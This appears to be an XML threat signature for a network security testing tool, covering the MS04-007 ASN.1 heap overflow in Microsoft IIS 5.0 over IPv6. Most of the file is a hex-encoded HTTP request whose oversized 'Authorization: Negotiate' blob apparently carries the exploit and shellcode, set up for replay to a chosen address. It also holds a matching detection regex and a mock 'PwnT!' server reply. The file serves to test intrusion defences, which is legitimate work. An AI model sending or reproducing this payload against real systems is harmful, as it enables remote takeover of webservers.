<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="MS04-007 HTTP ASN1 Heap Overflow (IPv6 Version)"/>
    <EngDesc display="true" value="This threat causes a heap overflow in the ASN.1 parser in Microsoft's Internet Information Services server (IIS).  This can be used to gain remote entry into a webserver. (IPv6 Version)"/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
      <item value="Unauthorized_Access"/>
    </Intent>
    <Protocol display="true" value="HTTP/IPv6"/>
    <Type_Of_Equipment display="true">
      <item value="Server"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_IIS"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_IIS_5.0"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.phreedom.org/solar/exploits/msasn1-bitstring/"/>
    <CVEID display="true" value="CVE-2003-0818"/>
    <bugtraqID display="true" value="13300"/>
    <OSVDB display="true" value="3902"/>
    <Author display="true" value="Chuck McAuley"/>
    <ID display="true" value="37260e8550808f6ff57faa5ba2fe9913"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="false"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="1236796529"/>
    <SigStyle display="false" value="Matching"/>
    <targetNode display="false" value="A"/>
    <SigProtocol display="false" value="TCP"/>
    <Rate display="false" value="1"/>
    <Regex display="false" value="\X47\X45\X54\X20\X2F\X20\X48\X54\X54\X50\X2F\X31\X2E\X30\X0D\X0A\X41\X75\X74\X68\X6F\X72\X69\X7A\X61\X74\X69\X6F\X6E\X3A\X20\X4E\X65\X67\X6F\X74\X69\X61\X74\X65\X20\X59\X49\X49\X51\X65\X67\X59\X47\X4B\X77\X59\X42\X42\X51\X55\X43\X6F\X49\X49\X51\X62\X6A\X43\X43\X45\X47\X71\X68\X67\X68\X42\X6D\X49\X34\X49\X51\X59\X67\X4F\X43\X42\X41\X45\X41\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55\X46\X42\X51\X55"/>
    <Created value="1139461790" display="false"/>
    <ServerSideAttack display="false" value="false"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="C"/>
      <for index="D"/>
      <for index="E"/>
      <for index="F"/>
      <for index="G"/>
    </for>
  </Loops>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A417574686F72697A6174696F6E3A204E65676F74696174652059494951656759474B775942425155436F494951626A4343454771686768426D4934495159674F4342414541515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251554642515546425155464251514D414934494D56774F4342416F416B454B51517042436B454C6F4F41414141454E4E5241446E65635A3535556D47536153744C756D6B476E444832516E31726376742F44754F5467377337383767594B335A426335792F724D5756314D79587A4D794C6B524D544141425731534A35596C6441476F775757534C4159744144497477484B324C57416A72444931584C4646532F39434A77316E7245476F49586748756167705A6933304167506B47644F5252552F38306A2B69514141414157596B456A754C724D66396D676579514156526F41514541415039564946645856316448563064582F31556369634D782F316458614149414968474A356D6F51566C502F56526858552F395646466457552F395645496E435A6F48735641434E5043517877476F5657664F726964664752435151525035454A44324A664352496958776B54496C384A46434E52435151564642525556464255556C52556639314146482F5654434A34576A2F2F2F2F2F2F7A482F565378582F31554D2F31556F55315657563474734A42694C5254794C564156344165714C5368694C57694142362B4D7953597330697748754D662F384D6343734F4F42304238485044514848362F4937664351556465474C576951423632614C4445754C57687742363473456977486F3677497877496E71583135645738494941454A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A43516B4A4351694D4B417767412B4138424150675041534F4343446B446767515241454E4451304D673850312F55315A585A6F48736741434A35756A74414141412F7A5A6F43524C57592B6A334141414169555949364B49414141442F6467526F6139417279756A69414141416955594D364438414141442F6467526F2B706343544F6A4E414141414D64746F454151414146502F30496E44566F743245496E48755241454141447A704634787746425155464E5155503957444974474347614278494141583135622F2B426736434D414141434C5243514D6A56683867304D38425946444B414151414143425979674138502F2F6977516B6738515555444841777A48535A5038795A496B694D6475346B454B51516A484A73514B4A332F4F7664414E44362F4F4A6668426B6A774A5959634E67767944772F582B4C4834744743496B4869332F34676364344151414169666B354758514569776E722B496E364F566F456441574C55675472396F6B5269556F45786B5039415748446F517A772F582B4C5142794C5741694A486F734169304149695559457732434C6243516F69305538693151466541487169306F5969316F674165766A4F456D4C4E497342376A482F4D63443872446A67644166427A773042782B76304F33776B4A48586869316F6B4165746D6977784C69316F634165754C4249734236496C454A42786877676741362F354451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E4451304E444934494549414D4A414F73476B4A43516B4A435141344945455142455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552455245524552413D3D0D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IPv6>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="" destMac="" pktType="">
        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IPv6>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
